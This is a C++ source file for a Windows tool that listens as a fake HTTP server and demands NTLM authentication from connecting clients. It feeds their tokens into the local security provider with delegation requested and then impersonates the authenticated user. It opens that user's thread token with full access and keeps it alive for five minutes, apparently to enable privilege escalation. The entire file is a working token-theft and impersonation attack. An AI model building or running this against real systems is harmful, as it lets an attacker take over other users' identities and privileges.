// tokenc.cpp : Defines the entry point for the console application.
#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#include <windows.h>
// regex
#include <regex>
#include <iostream>
// base64
#include "base64.h"


///////////////////////////////////////////////////////////////////////////////
#pragma comment(lib, "Secur32.lib")
#define SECURITY_WIN32
#include <sspi.h>
#define SECURITY_WIN32
#define SEC_SUCCESS(Status) ((Status) >= 0)

// set our data types etc..
CredHandle hcred;
static HANDLE letToken;
struct _SecHandle  hctxt;
static PBYTE g_pInBuf = NULL;
static PBYTE g_pOutBuf = NULL;
static DWORD g_cbMaxMessage;
static TCHAR g_lpPackageName[1024];
BOOL fNewConversation = TRUE;

// for printing username
#include <Lmcons.h>

// define it like in .h
BOOL GenServerContext(
    BYTE *pIn,
    DWORD cbIn,
    BYTE *pOut,
    DWORD *pcbOut,
    BOOL *pfDone,
    BOOL  fNewCredential
    );


void cleanup()
{
    if (g_pInBuf)
        free(g_pInBuf);

    if (g_pOutBuf)
        free(g_pOutBuf);

    WSACleanup();
    exit(0);
}




BOOL AcquireCreds()
{
    SECURITY_STATUS   ss;
    TimeStamp         Lifetime;
    PSecPkgInfo       pkgInfo;

    //  Set the default package to negotiate.
    tstrcpy_s(g_lpPackageName, 1024, TEXT("Negotiate"));

    // Initialize the security package.
    ss = QuerySecurityPackageInfo(g_lpPackageName, &pkgInfo);

    // get the max token size
    g_cbMaxMessage = pkgInfo->cbMaxToken;
    FreeContextBuffer(pkgInfo);

    // set the max token sizes
    g_pInBuf = (PBYTE)malloc(g_cbMaxMessage);
    g_pOutBuf = (PBYTE)malloc(g_cbMaxMessage);

    // get the security handles
    ss = AcquireCredentialsHandle(
        NULL,
        g_lpPackageName,
        SECPKG_CRED_INBOUND,
        NULL,
        NULL,
        NULL,
        NULL,
        &hcred,
        &Lifetime);

    if (!SEC_SUCCESS(ss))
    {
        fprintf(stderr, "AcquireCreds failed: 0x%08x\n", ss);
        return(FALSE);
    }

    return (TRUE);
}


///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
BOOL GenServerContext(BYTE *pIn, DWORD cbIn, BYTE *pOut, DWORD *pcbOut, BOOL *pfDone, BOOL fNewConversation)
{
    SECURITY_STATUS   ss;
    TimeStamp         Lifetime;
    SecBufferDesc     OutBuffDesc;
    SecBuffer         OutSecBuff;
    SecBufferDesc     InBuffDesc;
    SecBuffer         InSecBuff;
    ULONG             Attribs = ASC_REQ_DELEGATE; //0

    // prepare output buffers.
    OutBuffDesc.ulVersion = 0;
    OutBuffDesc.cBuffers = 1;
    OutBuffDesc.pBuffers = &OutSecBuff;

    // prepare output security buffers.
    OutSecBuff.cbBuffer = *pcbOut;
    OutSecBuff.BufferType = SECBUFFER_TOKEN;
    OutSecBuff.pvBuffer = pOut;

    // prepare input buffers.
    InBuffDesc.ulVersion = 0;
    InBuffDesc.cBuffers = 1;
    InBuffDesc.pBuffers = &InSecBuff;

    // prepare input security buffers
    InSecBuff.cbBuffer = cbIn;
    InSecBuff.BufferType = SECBUFFER_TOKEN;
    InSecBuff.pvBuffer = pIn;

    printf("Token buffer received (%lu bytes):\n", InSecBuff.cbBuffer);
    // PrintHexDump(InSecBuff.cbBuffer, (PBYTE)InSecBuff.pvBuffer);

    // Get the security context
    ss = AcceptSecurityContext(
        &hcred,
        fNewConversation ? NULL : &hctxt,
        &InBuffDesc,
        Attribs, //ASC_REQ_DELEGATE
        SECURITY_NATIVE_DREP,
        &hctxt,
        &OutBuffDesc,
        &Attribs,
        &Lifetime);

    if (!SEC_SUCCESS(ss))
    {
        fprintf(stderr, "AcceptSecurityContext failed: 0x%08x\n", ss);
        return FALSE;
    }

    //  Complete token if applicable.
    if ((SEC_I_COMPLETE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss))
    {
        printf("Calling complete auth token\n");
        ss = CompleteAuthToken(&hctxt, &OutBuffDesc);
        if (!SEC_SUCCESS(ss))
        {
            fprintf(stderr, "complete failed: 0x%08x\n", ss);
            return FALSE;
        }
    }

    // IT WORKED HERE!!!
    *pcbOut = OutSecBuff.cbBuffer;


    *pfDone = !((SEC_I_CONTINUE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss));

    // at the end print if its accepted
    printf("AcceptSecurityContext result = 0x%08x\n", ss);

    return TRUE;
}

///////////////////////////////////////////////////////////////////////////////
void test_imperson(){
    SECURITY_STATUS ss;
    SecPkgContext_Sizes SecPkgContextSizes;
    SecPkgContext_NegotiationInfo SecPkgNegInfo;
    ULONG cbMaxSignature;
    ULONG cbSecurityTrailer;
    //username bullshit
    LPTSTR pUserName = NULL;
    DWORD cbUserName = 0;
    

    ss = QueryContextAttributes(&hctxt, SECPKG_ATTR_SIZES, &SecPkgContextSizes);

    if (!SEC_SUCCESS(ss))
    {
        fprintf(stderr, "QueryContextAttributes failed: 0x%08x\n", ss);
        exit(1);
    }

    //----------------------------------------------------------------
    //  The following values are used for encryption and signing.
    cbMaxSignature = SecPkgContextSizes.cbMaxSignature;
    cbSecurityTrailer = SecPkgContextSizes.cbSecurityTrailer;

    ss = QueryContextAttributes(
        &hctxt,
        SECPKG_ATTR_NEGOTIATION_INFO,
        &SecPkgNegInfo);

    if (!SEC_SUCCESS(ss))
    {
        fprintf(stderr, "QueryContextAttributes failed: 0x%08x\n", ss);
        exit(1);
    }
    else
    {
        wprintf(L"PackageName: %s\n", (SecPkgNegInfo.PackageInfo->Name));
        wprintf(L"PackageName: %s\n", (SecPkgNegInfo.PackageInfo->Comment));
    }

    //  Free the allocated buffer.
    FreeContextBuffer(SecPkgNegInfo.PackageInfo);


    printf("Now impersonating via thread\n");
    ss = ImpersonateSecurityContext(&hctxt);
    // error check
    if (!SEC_SUCCESS(ss))
    {
        fprintf(stderr, "Impersonate failed: 0x%08x\n", ss);
        cleanup();
    }
    else
    {
        printf("Impersonation worked. \n");
    }


    DWORD dwErrorCode = 0;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &letToken))
    {
        printf("it WORKED!\n");
    }
    else
   {
      dwErrorCode = GetLastError();
      wprintf(L"OpenProcessToken failed. GetLastError returned: %d\n", dwErrorCode);

   }


    DWORD dwBufferSize = 0;
    GetTokenInformation(
        letToken,
        TokenUser,      // Request for a TOKEN_USER structure.
        NULL,
        0,
        &dwBufferSize
        );


    // username bullshit
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);
    std::cout << "Username: " << std::endl;
    for (int i = 0; (unsigned)i < size; i++) // use unsigned since dword is a unsigned int
        if (isalpha(username[i])) std::cout << (char)(username[i]
    );
    std::cout << "\n" << std::endl;

    /*
    SecPkgContext_SessionKey      SecPackSess;
    SecPkgContext_KeyInfo         SecPackKey;
    ss = QueryContextAttributes(&hctxt, SECPKG_ATTR_SESSION_KEY, &SecPackSess);
    ss = QueryContextAttributes(&hctxt, SECPKG_ATTR_KEY_INFO, &SecPackKey);
    */

    /*
    printf("OHHH YESSSSS!\n";
    printf("OHHH YESSSSS!\n";
    printf("Test calc.exe\n");
    if (!system("calc.exe")) {
        printf("test failed\n");
    }
    */

    //////////////////////////////////////////////////////////////////////
    printf("Check your tokens now bro!\n"); // sleep
    printf("Sleeping for 5min");
    Sleep(300000); //just a test
    //  Revert to self.
    
    ss = RevertSecurityContext(&hctxt);
    if (!SEC_SUCCESS(ss))
    {
        fprintf(stderr, "Revert failed: 0x%08x\n", ss);
        cleanup();
    }
    else
    {
        printf("Reverted to self.\n");
    }
}

//////////////////////////////////////////////////////////////////////////////
bool test_regex_search(const std::string& input, std::string& data_out, int& counter)
{
    std::regex rgx("(\\b(NTLM)\\s(.*))"); // NTLM hash match
    std::smatch match;
    
    // regex for NTLM b64 hash
    if (std::regex_search(input.begin(), input.end(), match, rgx))
    {

        //regex shit!
        std::cout << "Match[3] = " << match[3] << '\n';             //match[0] is everything
        std::vector<BYTE> decodedData = base64_decode(match[3]);
        BYTE *pData = &decodedData[0];                              // pointer to first element in array
        DWORD dSize = decodedData.size();                           //element length

        DWORD             cbOut;
        BOOL              done = FALSE;
        // setup auth
        if (fNewConversation) {
            printf("New Conversation\n");
            if (!AcquireCreds()){ 
                printf("AcquireCreds failed :( \n");
            }
        }

        if (!GenServerContext(pData, dSize, g_pOutBuf, &cbOut, &done, fNewConversation))
        {
            fprintf(stderr, "GenServerContext failed.\n");
            return(FALSE);
        }
        else
        {
            fNewConversation = FALSE;
        }

        if (done == TRUE){ 
            printf("It worked, testing impersonation!\n"); 
            // FUCK THE REST OF IT!!!
            test_imperson();
            exit(EXIT_SUCCESS);

        }

        //data for output
        data_out = base64_encode(g_pOutBuf, cbOut);

        return 1;
    }
    else
    {
        std::cout << "No match\n";
        return 0;
    }
}

///////////////////////////////////////////////////////////////////////////////
bool auth_caller_fun(SOCKET con_socket){
    // new function was easier!
    int bytesSent;
    int bytesRecv = SOCKET_ERROR;
    std::string data_out = "";                                              
    int counter = 0;                                                          // test counter
    
    while (1){ //loop forever
        char recvbuf[1024] = "";                                              // zero the buffer
        bytesRecv = recv(con_socket, recvbuf, 1024, 0);                       // get receve and bytes

        if (bytesRecv == SOCKET_ERROR)
        {
            printf("Client probably disconnected error %ld.\n", WSAGetLastError());
            break;
        }
        else
        {
            printf("Server: received %ld Bytes data is: %s\n", bytesRecv, recvbuf);
            counter++;                                                        // count our msgs
            
            if (test_regex_search(recvbuf, data_out, counter))                //Regex test
            {
                std::cout << "Counter is at: " << counter << "\n";

                // setup our string to add the data
                std::string prebuf;
                prebuf = "HTTP/1.1 401 Unauthorized\n";
                prebuf += "Server: CallThem/9 Bro/1.1.1\n";
                prebuf += "Date: Thu, 1 Jan 1970 00:00:01 UTC\n"; 
                prebuf += "WWW-Authenticate: NTLM " + data_out + "\n";
                prebuf += "Content-type: text/html\n";
                prebuf += "Content-Length: 0\n\n";

                // our buffer to send
                char sendbuf[1024];

                // copy the string to buffer
                strcpy_s(sendbuf, prebuf.c_str());

                // send it!!
                bytesSent = send(con_socket, sendbuf, strlen(sendbuf), 0);

            }
            else
            {
                // the reply if no hash provided!
                char sendbuf[1024] = "HTTP/1.1 401 Unauthorized\n"
                    "Server: CallThem/9 Bro/1.1.1\n"
                    "Date: Thu, 1 Jan 1970 00:00:01 UTC\n"
                    "WWW-Authenticate: NTLM\n"
                    "Content-type: text/html\n"
                    "Content-Length: 0\n\n";

                // send it!!
                bytesSent = send(con_socket, sendbuf, strlen(sendbuf), 0);
            }
        }
    }
    return 1;
}
///////////////////////////////////////////////////////////////////////////////



int main(int argc, char* argv[])
{
    // check the args first
    if (!argv[1] && argv[2])
    {
        printf("Usage test.exe 0.0.0.0 80\n");
        exit(0);
    }
    WORD wVersionRequested;
    WSADATA wsaData;
    int wsaerr;
    // Using MAKEWORD macro, Winsock version request 2.2
    wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    // Call the socket function and return its value to the m_socket variable.
    SOCKET m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    // Check for errors
    if (m_socket == INVALID_SOCKET)
    {
        printf("Server: Error at socket(): %ld\n", WSAGetLastError());
        WSACleanup();
        return 0;
    }
    else
    {
        printf("Server: socket() is OK!\n");
    }

    ////////////////bind//////////////////////////////
    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = inet_addr(argv[1]);
    service.sin_port = htons(atoi(argv[2]));

    // Cbind and check for general errors.
    if (bind(m_socket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR)
    {
        printf("Server: bind() failed: %ld.\n", WSAGetLastError());
        closesocket(m_socket);
        return 0;
    }
    else
    {
        printf("Server: bind() is OK!\n");
    }

    // Call the listen function, passing the created socket and max allowed
    if (listen(m_socket, 10) == SOCKET_ERROR)
        printf("Server: listen(): Error listening on socket %ld.\n", WSAGetLastError());
    else { printf("Server: listen() is OK, I'm waiting for connections...\n"); }

    // socket
    SOCKET AcceptSocket;
    printf("Server: Waiting for a client to connect...\n");

    // error checking
    while (1)
    {
        AcceptSocket = SOCKET_ERROR;
        while (AcceptSocket == SOCKET_ERROR)
        {
            AcceptSocket = accept(m_socket, NULL, NULL);
        }
        printf("Server: Client Connected!\n");
        //m_socket is now our socket object
        m_socket = AcceptSocket;
        break;
    }
    auth_caller_fun(m_socket);
    WSACleanup();
    return 0;
}
